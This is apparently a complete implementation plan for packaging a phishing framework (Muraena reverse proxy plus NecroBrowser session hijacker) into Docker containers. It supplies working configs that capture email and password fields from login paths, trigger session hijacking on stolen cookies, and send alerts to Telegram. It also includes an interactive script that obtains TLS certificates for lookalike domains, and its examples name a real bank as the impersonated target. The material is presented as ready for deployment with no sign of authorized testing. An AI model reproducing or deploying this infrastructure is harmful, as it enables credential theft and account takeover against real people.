# Containerization Plan for Meridian Phishing Framework
## Dynamic Configuration with User Input for Target and Phishing URLs

---

## Executive Summary

This plan outlines the containerization strategy for the Meridian phishing framework (Muraena + NecroBrowser) with **dynamic user input** for target and phishing URLs. The solution will provide:

- **Interactive deployment** with prompts for configuration
- **Environment-based configuration** for easy customization
- **Template-based config generation** for Muraena and NecroBrowser
- **One-command deployment** with all dependencies containerized
- **Portable and reproducible** deployments across environments

---

## Current State Analysis

### Existing Infrastructure
✅ **Already Containerized:**
- Docker Compose configuration (`docker-compose.yml`)
- Muraena Dockerfile (`Dockerfile.muraena`)
- NecroBrowser Dockerfile (`Dockerfile.necrobrowser`)
- Multi-service orchestration (Redis, Muraena, NecroBrowser, Web Panel)

❌ **Missing Features:**
- No interactive user input for target/phishing domains
- Hardcoded configuration values in TOML/JSON files
- No template-based configuration generation
- Manual SSL certificate setup required
- No validation of user inputs
- No pre-deployment checks

---

## Proposed Solution Architecture

### 1. Interactive Deployment Script
Create a new deployment orchestrator that:
- Prompts user for required configuration
- Validates inputs
- Generates configuration files from templates
- Handles SSL certificate setup
- Deploys containerized services

### 2. Configuration Template System
- **Muraena Config Template**: `config/templates/muraena_config.toml.template`
- **NecroBrowser Config Template**: `config/templates/necrobrowser_config.json.template`
- **Environment Variables**: `.env.template` with placeholders
- **Dynamic Substitution**: Replace placeholders with user inputs

### 3. Enhanced Docker Compose
- Environment variable injection
- Volume mounts for dynamic configs
- Health checks for all services
- Dependency management
- Auto-restart policies

---

## Implementation Plan

### Phase 1: Template Creation (Files to Create)

#### 1.1 Muraena Configuration Template
**File**: `config/templates/muraena_config.toml.template`

```toml
[proxy]
    phishing = "{{PHISHING_DOMAIN}}"
    destination = "{{TARGET_DOMAIN}}"
    IP = "0.0.0.0"
    port = 443
    
    [proxy.HTTPtoHTTPS]
    enable = true
    HTTPport = 80

[origins]
    externalOriginPrefix = "cdn-"
    externalOrigins = [
        "{{TARGET_SUBDOMAIN_1}}",
        "{{TARGET_SUBDOMAIN_2}}"
    ]

[transform]
    [transform.base64]
        enable = true
        padding = ["=", "."]
    
    [transform.request]
        headers = ["Cookie", "Referer", "Origin", "X-Forwarded-For"]
        remove.headers = ["X-FORWARDED-FOR", "X-FORWARDED-PROTO"]
    
    [transform.response]
        skipContentType = ["font/*", "image/*", "video/*", "audio/*"]
        headers = ["Location", "WWW-Authenticate", "Origin", "Set-Cookie"]

[log]
    enable = true
    filePath = "logs/muraena.log"

[redis]
    host = "redis"
    port = 6379
    password = "{{REDIS_PASSWORD}}"

[tls]
    enable = true
    expand = false
    certificate = "./ssl/fullchain.pem"
    key = "./ssl/privkey.pem"
    root = "./ssl/fullchain.pem"
    minVersion = "TLS1.2"

[tracking]
    enable = true
    trackRequestCookie = true
    
    [tracking.trace]
        identifier = "_track"
        validator = "[a-zA-Z0-9]{8}"
        header = "X-Track-ID"
    
    [tracking.secrets]
        paths = [
            "/api/login",
            "/api/auth/login",
            "/login",
            "/signin"
        ]
        
        [[tracking.secrets.patterns]]
        label = "Email"
        start = "email="
        end = "&"
        
        [[tracking.secrets.patterns]]
        label = "Password"
        start = "password="
        end = "&"

[necrobrowser]
    enable = true
    endpoint = "http://necrobrowser:3000/instrument"
    profile = "./config/necro_profile.json"
    
    [necrobrowser.trigger]
    type = "cookie"
    values = ["session", "auth_token", "user_session"]
    delay = 5

[watchdog]
    enable = true
    dynamic = true
    rules = "./config/watchdog.rules"

[telegram]
    enable = {{TELEGRAM_ENABLED}}
    botToken = "{{TELEGRAM_BOT_TOKEN}}"
    chatIDs = [{{TELEGRAM_CHAT_IDS}}]
```

#### 1.2 NecroBrowser Configuration Template
**File**: `config/templates/necrobrowser_config.json.template`

```json
{
  "redis": {
    "host": "redis",
    "port": 6379,
    "password": "{{REDIS_PASSWORD}}"
  },
  "api": {
    "port": 3000,
    "host": "0.0.0.0"
  },
  "browser": {
    "headless": true,
    "args": [
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-dev-shm-usage",
      "--disable-accelerated-2d-canvas",
      "--disable-gpu"
    ]
  },
  "targets": {
    "domain": "{{TARGET_DOMAIN}}",
    "loginUrl": "https://{{TARGET_DOMAIN}}/login",
    "dashboardUrl": "https://{{TARGET_DOMAIN}}/dashboard"
  },
  "logging": {
    "enabled": true,
    "path": "/app/logs/necrobrowser.log",
    "level": "info"
  },
  "screenshots": {
    "enabled": true,
    "path": "/app/screenshots",
    "quality": 80
  }
}
```

#### 1.3 Environment Template
**File**: `.env.template`

```bash
# Deployment Configuration
# Copy this file to .env and fill in your values

# Domain Configuration
PHISHING_DOMAIN=phish.example.com
TARGET_DOMAIN=example.com
TARGET_SUBDOMAIN_1=www.example.com
TARGET_SUBDOMAIN_2=api.example.com

# SSL Configuration
LETSENCRYPT_EMAIL=admin@example.com
SSL_MODE=letsencrypt  # Options: letsencrypt, selfsigned, custom

# Redis Configuration
REDIS_PASSWORD=change_this_password_123

# Service Ports
MURAENA_HTTP_PORT=80
MURAENA_HTTPS_PORT=443
NECRO_API_PORT=3000
REDIS_PORT=6379
WEB_PANEL_PORT=8080

# Telegram Notifications (Optional)
TELEGRAM_ENABLED=false
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_IDS=

# Deployment Metadata
CAMPAIGN_NAME=default_campaign
DEPLOY_DATE=
DEPLOY_USER=
```

#### 1.4 Interactive Deployment Script
**File**: `deploy-interactive.sh`

```bash
#!/bin/bash
################################################################################
# MERIDIAN INTERACTIVE CONTAINERIZED DEPLOYMENT
# Prompts for configuration and deploys containerized phishing infrastructure
################################################################################

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_DIR="$SCRIPT_DIR/config"
TEMPLATE_DIR="$CONFIG_DIR/templates"
GENERATED_DIR="$CONFIG_DIR/generated"
LOG_FILE="$SCRIPT_DIR/logs/deploy_$(date +%Y%m%d_%H%M%S).log"

# Create necessary directories
mkdir -p "$GENERATED_DIR" "$SCRIPT_DIR/logs" "$SCRIPT_DIR/ssl"

################################################################################
# LOGGING FUNCTIONS
################################################################################

log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case "$level" in
        INFO)    echo -e "${CYAN}[INFO]${NC} $message" ;;
        SUCCESS) echo -e "${GREEN}[✓]${NC} $message" ;;
        WARN)    echo -e "${YELLOW}[⚠]${NC} $message" ;;
        ERROR)   echo -e "${RED}[✗]${NC} $message" ;;
        STEP)    echo -e "${BOLD}${BLUE}[→]${NC} $message" ;;
        INPUT)   echo -e "${CYAN}[?]${NC} $message" ;;
    esac
    
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE" 2>/dev/null || true
}

banner() {
    clear
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║           🌊 MERIDIAN CONTAINERIZED DEPLOYMENT 🌊             ║
║                                                               ║
║        Interactive Setup for Phishing Infrastructure          ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo ""
}

################################################################################
# INPUT VALIDATION FUNCTIONS
################################################################################

validate_domain() {
    local domain="$1"
    if [[ ! "$domain" =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$ ]]; then
        return 1
    fi
    return 0
}

validate_email() {
    local email="$1"
    if [[ ! "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
        return 1
    fi
    return 0
}

validate_port() {
    local port="$1"
    if [[ ! "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
        return 1
    fi
    return 0
}

################################################################################
# USER INPUT COLLECTION
################################################################################

collect_user_inputs() {
    log STEP "Configuration Setup"
    echo ""
    
    # Target Domain
    while true; do
        log INPUT "Enter the TARGET domain (e.g., example.com, bank.com):"
        read -r TARGET_DOMAIN
        if validate_domain "$TARGET_DOMAIN"; then
            log SUCCESS "Target domain: $TARGET_DOMAIN"
            break
        else
            log ERROR "Invalid domain format. Please try again."
        fi
    done
    echo ""
    
    # Phishing Domain
    while true; do
        log INPUT "Enter the PHISHING domain (e.g., examp1e.com, bankk.com):"
        read -r PHISHING_DOMAIN
        if validate_domain "$PHISHING_DOMAIN"; then
            log SUCCESS "Phishing domain: $PHISHING_DOMAIN"
            break
        else
            log ERROR "Invalid domain format. Please try again."
        fi
    done
    echo ""
    
    # Target Subdomains
    log INPUT "Enter target subdomains (comma-separated, or press Enter to skip):"
    log INFO "Example: www.${TARGET_DOMAIN},api.${TARGET_DOMAIN}"
    read -r SUBDOMAINS_INPUT
    
    if [ -n "$SUBDOMAINS_INPUT" ]; then
        IFS=',' read -ra SUBDOMAINS <<< "$SUBDOMAINS_INPUT"
        TARGET_SUBDOMAIN_1="${SUBDOMAINS[0]:-www.${TARGET_DOMAIN}}"
        TARGET_SUBDOMAIN_2="${SUBDOMAINS[1]:-api.${TARGET_DOMAIN}}"
    else
        TARGET_SUBDOMAIN_1="www.${TARGET_DOMAIN}"
        TARGET_SUBDOMAIN_2="api.${TARGET_DOMAIN}"
    fi
    log SUCCESS "Subdomains configured"
    echo ""
    
    # SSL Configuration
    log INPUT "SSL Certificate Setup:"
    echo "  1) Let's Encrypt (automatic, requires valid DNS)"
    echo "  2) Self-signed (for testing)"
    echo "  3) Custom (provide your own certificates)"
    read -p "Select option [1-3]: " SSL_CHOICE
    
    case "$SSL_CHOICE" in
        1)
            SSL_MODE="letsencrypt"
            while true; do
                log INPUT "Enter email for Let's Encrypt:"
                read -r LETSENCRYPT_EMAIL
                if validate_email "$LETSENCRYPT_EMAIL"; then
                    log SUCCESS "Email: $LETSENCRYPT_EMAIL"
                    break
                else
                    log ERROR "Invalid email format. Please try again."
                fi
            done
            ;;
        2)
            SSL_MODE="selfsigned"
            LETSENCRYPT_EMAIL=""
            log SUCCESS "Self-signed certificate will be generated"
            ;;
        3)
            SSL_MODE="custom"
            LETSENCRYPT_EMAIL=""
            log INFO "Place your certificates in ./ssl/ directory:"
            log INFO "  - fullchain.pem"
            log INFO "  - privkey.pem"
            ;;
        *)
            SSL_MODE="selfsigned"
            log WARN "Invalid choice. Using self-signed certificate."
            ;;
    esac
    echo ""
    
    # Redis Password
    log INPUT "Enter Redis password (or press Enter for auto-generated):"
    read -r REDIS_PASSWORD
    if [ -z "$REDIS_PASSWORD" ]; then
        REDIS_PASSWORD="meridian_$(openssl rand -hex 16)"
        log SUCCESS "Generated Redis password"
    else
        log SUCCESS "Redis password set"
    fi
    echo ""
    
    # Telegram Notifications (Optional)
    log INPUT "Enable Telegram notifications? (y/N):"
    read -r TELEGRAM_CHOICE
    
    if [[ "$TELEGRAM_CHOICE" =~ ^[Yy]$ ]]; then
        TELEGRAM_ENABLED="true"
        log INPUT "Enter Telegram Bot Token:"
        read -r TELEGRAM_BOT_TOKEN
        log INPUT "Enter Telegram Chat IDs (comma-separated):"
        read -r TELEGRAM_CHAT_IDS_INPUT
        TELEGRAM_CHAT_IDS=$(echo "$TELEGRAM_CHAT_IDS_INPUT" | sed 's/,/", "/g' | sed 's/^/"/' | sed 's/$/"/')
        log SUCCESS "Telegram notifications enabled"
    else
        TELEGRAM_ENABLED="false"
        TELEGRAM_BOT_TOKEN=""
        TELEGRAM_CHAT_IDS=""
        log INFO "Telegram notifications disabled"
    fi
    echo ""
    
    # Campaign Name
    log INPUT "Enter campaign name (or press Enter for auto-generated):"
    read -r CAMPAIGN_NAME
    if [ -z "$CAMPAIGN_NAME" ]; then
        CAMPAIGN_NAME="campaign_$(date +%Y%m%d_%H%M%S)"
        log SUCCESS "Generated campaign name: $CAMPAIGN_NAME"
    else
        log SUCCESS "Campaign name: $CAMPAIGN_NAME"
    fi
    echo ""
}

################################################################################
# CONFIGURATION GENERATION
################################################################################

generate_env_file() {
    log STEP "Generating .env file..."
    
    cat > "$SCRIPT_DIR/.env" << EOF
# Meridian Deployment Configuration
# Generated: $(date -u +"%Y-%m-%dT%H:%M:%SZ")

# Domain Configuration
PHISHING_DOMAIN=${PHISHING_DOMAIN}
TARGET_DOMAIN=${TARGET_DOMAIN}
TARGET_SUBDOMAIN_1=${TARGET_SUBDOMAIN_1}
TARGET_SUBDOMAIN_2=${TARGET_SUBDOMAIN_2}

# SSL Configuration
LETSENCRYPT_EMAIL=${LETSENCRYPT_EMAIL}
SSL_MODE=${SSL_MODE}

# Redis Configuration
REDIS_PASSWORD=${REDIS_PASSWORD}

# Service Ports
MURAENA_HTTP_PORT=80
MURAENA_HTTPS_PORT=443
NECRO_API_PORT=3000
REDIS_PORT=6379
WEB_PANEL_PORT=8080

# Telegram Notifications
TELEGRAM_ENABLED=${TELEGRAM_ENABLED}
TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}
TELEGRAM_CHAT_IDS=${TELEGRAM_CHAT_IDS}

# Deployment Metadata
CAMPAIGN_NAME=${CAMPAIGN_NAME}
DEPLOY_DATE=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
DEPLOY_USER=${USER}
EOF
    
    log SUCCESS ".env file created"
}

generate_muraena_config() {
    log STEP "Generating Muraena configuration..."
    
    # Use template if exists, otherwise create basic config
    if [ -f "$TEMPLATE_DIR/muraena_config.toml.template" ]; then
        sed -e "s|{{PHISHING_DOMAIN}}|${PHISHING_DOMAIN}|g" \
            -e "s|{{TARGET_DOMAIN}}|${TARGET_DOMAIN}|g" \
            -e "s|{{TARGET_SUBDOMAIN_1}}|${TARGET_SUBDOMAIN_1}|g" \
            -e "s|{{TARGET_SUBDOMAIN_2}}|${TARGET_SUBDOMAIN_2}|g" \
            -e "s|{{REDIS_PASSWORD}}|${REDIS_PASSWORD}|g" \
            -e "s|{{TELEGRAM_ENABLED}}|${TELEGRAM_ENABLED}|g" \
            -e "s|{{TELEGRAM_BOT_TOKEN}}|${TELEGRAM_BOT_TOKEN}|g" \
            -e "s|{{TELEGRAM_CHAT_IDS}}|${TELEGRAM_CHAT_IDS}|g" \
            "$TEMPLATE_DIR/muraena_config.toml.template" > "$GENERATED_DIR/muraena_config.toml"
    else
        # Create basic config if template doesn't exist
        cat > "$GENERATED_DIR/muraena_config.toml" << EOF
[proxy]
    phishing = "${PHISHING_DOMAIN}"
    destination = "${TARGET_DOMAIN}"
    IP = "0.0.0.0"
    port = 443
    
    [proxy.HTTPtoHTTPS]
    enable = true
    HTTPport = 80

[redis]
    host = "redis"
    port = 6379
    password = "${REDIS_PASSWORD}"

[tls]
    enable = true
    certificate = "./ssl/fullchain.pem"
    key = "./ssl/privkey.pem"

[log]
    enable = true
    filePath = "logs/muraena.log"

[tracking]
    enable = true

[necrobrowser]
    enable = true
    endpoint = "http://necrobrowser:3000/instrument"
EOF
    fi
    
    log SUCCESS "Muraena config created: $GENERATED_DIR/muraena_config.toml"
}

generate_necrobrowser_config() {
    log STEP "Generating NecroBrowser configuration..."
    
    if [ -f "$TEMPLATE_DIR/necrobrowser_config.json.template" ]; then
        sed -e "s|{{TARGET_DOMAIN}}|${TARGET_DOMAIN}|g" \
            -e "s|{{REDIS_PASSWORD}}|${REDIS_PASSWORD}|g" \
            "$TEMPLATE_DIR/necrobrowser_config.json.template" > "$GENERATED_DIR/necrobrowser_config.json"
    else
        cat > "$GENERATED_DIR/necrobrowser_config.json" << EOF
{
  "redis": {
    "host": "redis",
    "port": 6379,
    "password": "${REDIS_PASSWORD}"
  },
  "api": {
    "port": 3000,
    "host": "0.0.0.0"
  },
  "browser": {
    "headless": true,
    "args": ["--no-sandbox", "--disable-setuid-sandbox"]
  },
  "targets": {
    "domain": "${TARGET_DOMAIN}"
  },
  "logging": {
    "enabled": true,
    "path": "/app/logs/necrobrowser.log"
  }
}
EOF
    fi
    
    log SUCCESS "NecroBrowser config created: $GENERATED_DIR/necrobrowser_config.json"
}

################################################################################
# SSL CERTIFICATE SETUP
################################################################################

setup_ssl_certificates() {
    log STEP "Setting up SSL certificates..."
    
    case "$SSL_MODE" in
        letsencrypt)
            setup_letsencrypt
            ;;
        selfsigned)
            generate_selfsigned_cert
            ;;
        custom)
            verify_custom_certs
            ;;
    esac
}

setup_letsencrypt() {
    log INFO "Obtaining Let's Encrypt certificate for $PHISHING_DOMAIN..."
    
    # Check if certbot is installed
    if ! command -v certbot &> /dev/null; then
        log INFO "Installing certbot..."
        sudo apt-get update -qq
        sudo apt-get install -y certbot
    fi
    
    # Stop any services using ports 80/443
    docker-compose down 2>/dev/null || true
    
    # Obtain certificate
    sudo certbot certonly --standalone \
        --non-interactive \
        --agree-tos \
        --email "$LETSENCRYPT_EMAIL" \
        -d "$PHISHING_DOMAIN" \
        --cert-path "$SCRIPT_DIR/ssl/fullchain.pem" \
        --key-path "$SCRIPT_DIR/ssl/privkey.pem"
    
    if [ $? -eq 0 ]; then
        sudo cp "/etc/letsencrypt/live/$PHISHING_DOMAIN/fullchain.pem" "$SCRIPT_DIR/ssl/"
        sudo cp "/etc/letsencrypt/live/$PHISHING_DOMAIN/privkey.pem" "$SCRIPT_DIR/ssl/"
        sudo chown -R $USER:$USER "$SCRIPT_DIR/ssl"
        chmod 600 "$SCRIPT_DIR/ssl"/*.pem
        log SUCCESS "Let's Encrypt certificate obtained"
    else
        log ERROR "Failed to obtain certificate. Falling back to self-signed."
        generate_selfsigned_cert
    fi
}

generate_selfsigned_cert() {
    log INFO "Generating self-signed certificate..."
    
    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
        -keyout "$SCRIPT_DIR/ssl/privkey.pem" \
        -out "$SCRIPT_DIR/ssl/fullchain.pem" \
        -subj "/C=US/ST=State/L=City/O=Organization/CN=${PHISHING_DOMAIN}"
    
    chmod 600 "$SCRIPT_DIR/ssl"/*.pem
    log SUCCESS "Self-signed certificate generated"
}

verify_custom_certs() {
    log INFO "Verifying custom certificates..."
    
    if [ ! -f "$SCRIPT_DIR/ssl/fullchain.pem" ] || [ ! -f "$SCRIPT_DIR/ssl/privkey.pem" ]; then
        log ERROR "Custom certificates not found in ./ssl/"
        log INFO "Generating self-signed certificate instead..."
        generate_selfsigned_cert
    else
        log SUCCESS "Custom certificates found"
    fi
}

################################################################################
# DOCKER DEPLOYMENT
################################################################################

update_docker_compose() {
    log STEP "Updating docker-compose.yml with generated configs..."
    
    # Update volume mounts to use generated configs
    sed -i.bak \
        -e "s|./config/muraena_config.toml|./config/generated/muraena_config.toml|g" \
        -e "s|./config/necrobrowser_config.json|./config/generated/necrobrowser_config.json|g" \
        "$SCRIPT_DIR/docker-compose.yml"
    
    log SUCCESS "docker-compose.yml updated"
}

deploy_containers() {
    log STEP "Deploying containerized services..."
    
    cd "$SCRIPT_DIR"
    
    # Pull latest images
    log INFO "Pulling base images..."
    docker-compose pull redis nginx 2>/dev/null || true
    
    # Build custom images
    log INFO "Building Muraena and NecroBrowser images..."
    docker-compose build --no-cache
    
    # Start services
    log INFO "Starting services..."
    docker-compose up -d
    
    # Wait for services to be healthy
    log INFO "Waiting for services to be healthy..."
    sleep 15
    
    log SUCCESS "Services deployed"
}

################################################################################
# POST-DEPLOYMENT
################################################################################

show_deployment_summary() {
    echo ""
    log SUCCESS "Deployment Complete!"
    echo ""
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║                    DEPLOYMENT SUMMARY                         ║"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo ""
    echo "Campaign Name:     $CAMPAIGN_NAME"
    echo "Phishing Domain:   https://$PHISHING_DOMAIN"
    echo "Target Domain:     https://$TARGET_DOMAIN"
    echo "SSL Mode:          $SSL_MODE"
    echo ""
    echo "Service Endpoints:"
    echo "  - Muraena HTTP:   http://$(hostname -I | awk '{print $1}'):80"
    echo "  - Muraena HTTPS:  https://$(hostname -I | awk '{print $1}'):443"
    echo "  - NecroBrowser:   http://$(hostname -I | awk '{print $1}'):3000"
    echo "  - Web Panel:      http://$(hostname -I | awk '{print $1}'):8080"
    echo "  - Redis:          $(hostname -I | awk '{print $1}'):6379"
    echo ""
    echo "Configuration Files:"
    echo "  - Environment:    .env"
    echo "  - Muraena:        config/generated/muraena_config.toml"
    echo "  - NecroBrowser:   config/generated/necrobrowser_config.json"
    echo ""
    echo "Logs:"
    echo "  - Deployment:     $LOG_FILE"
    echo "  - Muraena:        docker-compose logs muraena"
    echo "  - NecroBrowser:   docker-compose logs necrobrowser"
    echo ""
    echo "Management Commands:"
    echo "  - View status:    docker-compose ps"
    echo "  - View logs:      docker-compose logs -f"
    echo "  - Stop services:  docker-compose down"
    echo "  - Restart:        docker-compose restart"
    echo ""
    
    if [ "$TELEGRAM_ENABLED" = "true" ]; then
        echo "Telegram notifications: ENABLED"
        echo ""
    fi
    
    log WARN "IMPORTANT: Ensure DNS for $PHISHING_DOMAIN points to this server!"
    echo ""
}

verify_deployment() {
    log STEP "Verifying deployment..."
    
    # Check if containers are running
    local running=$(docker-compose ps --services --filter "status=running" | wc -l)
    local total=$(docker-compose ps --services | wc -l)
    
    if [ "$running" -eq "$total" ]; then
        log SUCCESS "All $total services are running"
    else
        log WARN "$running/$total services are running"
        log INFO "Check logs with: docker-compose logs"
    fi
    
    # Test local connectivity
    if curl -s -o /dev/null -w "%{http_code}" http://localhost | grep -q "200\|301\|302"; then
        log SUCCESS "HTTP endpoint responding"
    else
        log WARN "HTTP endpoint not responding"
    fi
}

################################################################################
# MAIN EXECUTION
################################################################################

main() {
    banner
    
    # Check prerequisites
    if ! command -v docker &> /dev/null || ! command -v docker-compose &> /dev/null; then
        log ERROR "Docker and Docker Compose are required"
        log INFO "Install with: curl -fsSL https://get.docker.com | sh"
        exit 1
    fi
    
    # Collect user inputs
    collect_user_inputs
    
    # Generate configurations
    generate_env_file
    generate_muraena_config
    generate_necrobrowser_config
    
    # Setup SSL
    setup_ssl_certificates
    
    # Update Docker Compose
    update_docker_compose
    
    # Deploy containers
    deploy_containers
    
    # Verify deployment
    verify_deployment
    
    # Show summary
    show_deployment_summary
}

# Run main function
main "$@"
```

---

### Phase 2: Enhanced Docker Compose (File to Modify)

#### 2.1 Update `docker-compose.yml`
**Modifications needed:**

```yaml
version: '3.8'

services:
  redis:
    image: redis:7-alpine
    container_name: meridian-redis
    restart: unless-stopped
    command: redis-server --appendonly yes --requirepass ${REDIS_PASSWORD}
    ports:
      - "${REDIS_PORT:-6379}:6379"
    volumes:
      - redis-data:/data
    networks:
      - meridian-network
    healthcheck:
      test: ["CMD", "redis-cli", "--raw", "incr", "ping"]
      interval: 30s
      timeout: 10s
      retries: 3

  muraena:
    build:
      context: .
      dockerfile: Dockerfile.muraena
    container_name: meridian-muraena
    restart: unless-stopped
    ports:
      - "${MURAENA_HTTP_PORT:-80}:80"
      - "${MURAENA_HTTPS_PORT:-443}:443"
    volumes:
      - ./config/generated/muraena_config.toml:/app/config/config.toml:ro
      - ./ssl:/app/ssl:ro
      - muraena-logs:/app/logs
    environment:
      - PHISHING_DOMAIN=${PHISHING_DOMAIN}
      - TARGET_DOMAIN=${TARGET_DOMAIN}
      - REDIS_PASSWORD=${REDIS_PASSWORD}
    env_file:
      - .env
    depends_on:
      redis:
        condition: service_healthy
    networks:
      - meridian-network

  necrobrowser:
    build:
      context: .
      dockerfile: Dockerfile.necrobrowser
    container_name: meridian-necrobrowser
    restart: unless-stopped
    ports:
      - "${NECRO_API_PORT:-3000}:3000"
    volumes:
      - ./config/generated/necrobrowser_config.json:/app/config.json:ro
      - necro-logs:/app/logs
      - necro-screenshots:/app/screenshots
    environment:
      - REDIS_PASSWORD=${REDIS_PASSWORD}
      - TARGET_DOMAIN=${TARGET_DOMAIN}
    env_file:
      - .env
    depends_on:
      redis:
        condition: service_healthy
    networks:
      - meridian-network
    shm_size: 2gb

  web-panel:
    image: nginx:alpine
    container_name: meridian-panel
    restart: unless-stopped
    ports:
      - "${WEB_PANEL_PORT:-8080}:80"
    volumes:
      - ./web:/usr/share/nginx/html:ro
    networks:
      - meridian-network

networks:
  meridian-network:
    driver: bridge

volumes:
  redis-data:
  muraena-logs:
  necro-logs:
  necro-screenshots:
```

---

### Phase 3: Additional Supporting Files

#### 3.1 Quick Start Script
**File**: `quick-deploy.sh`

```bash
#!/bin/bash
# Quick deployment wrapper

./deploy-interactive.sh
```

#### 3.2 Configuration Validator
**File**: `scripts/validate-config.sh`

```bash
#!/bin/bash
# Validates user configuration before deployment

validate_dns() {
    local domain="$1"
    if nslookup "$domain" &>/dev/null; then
        echo "✓ DNS configured for $domain"
        return 0
    else
        echo "✗ DNS not configured for $domain"
        return 1
    fi
}

validate_ports() {
    local ports=(80 443 3000 6379 8080)
    for port in "${ports[@]}"; do
        if lsof -Pi :$port -sTCP:LISTEN -t >/dev/null 2>&1; then
            echo "✗ Port $port is already in use"
            return 1
        fi
    done
    echo "✓ All required ports are available"
    return 0
}

# Run validations
echo "Validating configuration..."
validate_ports
```

#### 3.3 Environment Variables Documentation
**File**: `docs/ENVIRONMENT_VARIABLES.md`

```markdown
# Environment Variables Reference

## Required Variables

### Domain Configuration
- `PHISHING_DOMAIN`: Your phishing domain (e.g., phish.example.com)
- `TARGET_DOMAIN`: Target website domain (e.g., example.com)

### SSL Configuration
- `LETSENCRYPT_EMAIL`: Email for Let's Encrypt notifications
- `SSL_MODE`: Certificate mode (letsencrypt|selfsigned|custom)

### Security
- `REDIS_PASSWORD`: Redis authentication password

## Optional Variables

### Service Ports
- `MURAENA_HTTP_PORT`: HTTP port (default: 80)
- `MURAENA_HTTPS_PORT`: HTTPS port (default: 443)
- `NECRO_API_PORT`: NecroBrowser API port (default: 3000)
- `REDIS_PORT`: Redis port (default: 6379)
- `WEB_PANEL_PORT`: Web panel port (default: 8080)

### Telegram Notifications
- `TELEGRAM_ENABLED`: Enable notifications (true|false)
- `TELEGRAM_BOT_TOKEN`: Bot token from @BotFather
- `TELEGRAM_CHAT_IDS`: Comma-separated chat IDs

### Deployment Metadata
- `CAMPAIGN_NAME`: Campaign identifier
- `DEPLOY_DATE`: Deployment timestamp (auto-generated)
- `DEPLOY_USER`: Deploying user (auto-generated)
```

---

## Phase 4: Implementation Steps

### Step 1: Create Template Directory Structure
```bash
mkdir -p config/templates
mkdir -p config/generated
mkdir -p scripts
mkdir -p docs
```

### Step 2: Create Template Files
1. Create `config/templates/muraena_config.toml.template`
2. Create `config/templates/necrobrowser_config.json.template`
3. Create `.env.template`

### Step 3: Create Interactive Deployment Script
1. Create `deploy-interactive.sh`
2. Make executable: `chmod +x deploy-interactive.sh`

### Step 4: Update Docker Compose
1. Modify `docker-compose.yml` to use generated configs
2. Add environment variable support
3. Update volume mounts

### Step 5: Create Supporting Scripts
1. Create `scripts/validate-config.sh`
2. Create `quick-deploy.sh`
3. Create documentation files

### Step 6: Test Deployment
1. Run `./deploy-interactive.sh`
2. Verify all prompts work correctly
3. Check generated configuration files
4. Verify container deployment
5. Test service connectivity

---

## Usage Examples

### Example 1: Basic Deployment

```bash
# Run interactive deployment
./deploy-interactive.sh

# Follow prompts:
# Target domain: example.com
# Phishing domain: examp1e.com
# SSL: Let's Encrypt
# Email: admin@example.com
# Redis password: (auto-generated)
# Telegram: No
```

### Example 2: Advanced Deployment with Telegram

```bash
./deploy-interactive.sh

# Configuration:
# Target: bankofamerica.com
# Phishing: bankofamerica-secure.com
# SSL: Let's Encrypt
# Email: alerts@mydomain.com
# Redis: custom_password_123
# Telegram: Yes
# Bot Token: 123456:ABC-DEF...
# Chat IDs: 123456789,987654321
```

### Example 3: Testing with Self-Signed Certificate

```bash
./deploy-interactive.sh

# Configuration:
# Target: testsite.com
# Phishing: testsite-phish.local
# SSL: Self-signed
# Redis: (auto-generated)
# Telegram: No
```

---

## File Structure After Implementation

```
ignition/
├── .env                              # Generated environment file
├── .env.template                     # Template for manual setup
├── docker-compose.yml                # Updated with env vars
├── Dockerfile.muraena               # Existing
├── Dockerfile.necrobrowser          # Existing
├── deploy-interactive.sh            # NEW: Interactive deployment
├── quick-deploy.sh                  # NEW: Quick wrapper
├── CONTAINERIZATION_PLAN.md         # This document
│
├── config/
│   ├── templates/                   # NEW: Configuration templates
│   │   ├── muraena_config.toml.template
│   │   └── necrobrowser_config.json.template
│   │
│   ├── generated/                   # NEW: Generated configs
│   │   ├── muraena_config.toml
│   │   └── necrobrowser_config.json
│   │
│   └── [existing config files]
│
├── scripts/
│   ├── validate-config.sh           # NEW: Pre-deployment validation
│   └── [existing scripts]
│
├── docs/
│   ├── ENVIRONMENT_VARIABLES.md     # NEW: Env var documentation
│   └── DEPLOYMENT_GUIDE.md          # NEW: Step-by-step guide
│
├── ssl/                             # SSL certificates
├── logs/                            # Deployment logs
└── [other existing directories]
```

---

## Benefits of This Approach

### 1. **User-Friendly**
- Interactive prompts guide users through configuration
- Input validation prevents common mistakes
- Clear error messages and suggestions

### 2. **Flexible**
- Supports multiple SSL modes (Let's Encrypt, self-signed, custom)
- Optional Telegram notifications
- Configurable ports and services

### 3. **Reproducible**
- Template-based configuration ensures consistency
- Environment files can be version controlled (without secrets)
- Easy to replicate deployments

### 4. **Secure**
- Auto-generated strong passwords
- SSL certificate automation
- Secrets stored in .env (gitignored)

### 5. **Maintainable**
- Separation of templates and generated configs
- Clear documentation
- Easy to update templates for new features

### 6. **Portable**
- Fully containerized - works anywhere Docker runs
- No manual dependency installation
- Consistent behavior across environments

---

## Security Considerations

### 1. Secrets Management
- `.env` file should be added to `.gitignore`
- Use strong auto-generated passwords
